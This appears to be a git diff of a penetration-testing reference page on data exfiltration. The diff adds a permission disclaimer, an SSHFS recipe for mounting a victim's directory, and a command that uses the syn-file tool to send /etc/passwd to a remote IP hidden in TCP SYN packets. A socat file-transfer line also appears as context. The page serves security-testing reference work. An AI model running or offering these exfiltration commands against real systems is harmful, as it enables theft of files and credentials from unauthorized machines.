@@ -1,4 +1,10 @@
-# Exfiltration
+# Data Exfiltration
+
+{% hint style="success" %}
+Hack Responsibly.
+
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.‌
+{% endhint %}
 
 Not much here yet...please feel free to contribute at [https://www.github.com/zweilosec](https://github.com/zweilosec)
 
@@ -152,5 +158,25 @@ socat TCP4:$IP:$port file:$filename,create
 ```
 
 `sudo` is necessary if the port is under 1024. `fork` allows for multiple connections.
+
+## SSHFS
+
+If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
+
+```bash
+sudo apt install sshfs
+sudo mkdir /mnt/sshfs
+sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
+```
+
+## Data exfiltration using TCP SYN <a href="#h-data-exfiltration-using-tcp-syn" id="h-data-exfiltration-using-tcp-syn"></a>
+
+We can use TCP SYN sequence number packets to exfiltrate data using the `syn-file` tool.
+
+```bash
+./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081 -m 00:0C:0A:4a:3b:5ch
+```
+
+* [https://github.com/defensahacker/syn-file](https://github.com/defensahacker/syn-file)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
